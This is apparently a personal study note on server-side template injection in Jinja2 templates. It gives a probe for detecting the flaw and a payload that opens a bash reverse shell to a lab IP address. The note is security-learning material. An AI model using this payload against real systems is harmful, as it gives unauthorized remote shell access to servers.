---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[SSTI]]  
___

## Description:  

Enter `{{ 4*4 }}` in a field to see if it is vulnerable.

This can lead to a rev shell
```
{{ config['RUNCMD']('bash -i >& /dev/tcp/10.10.14.23/8000 0>&1',shell=True) }}
```

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (02:25 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
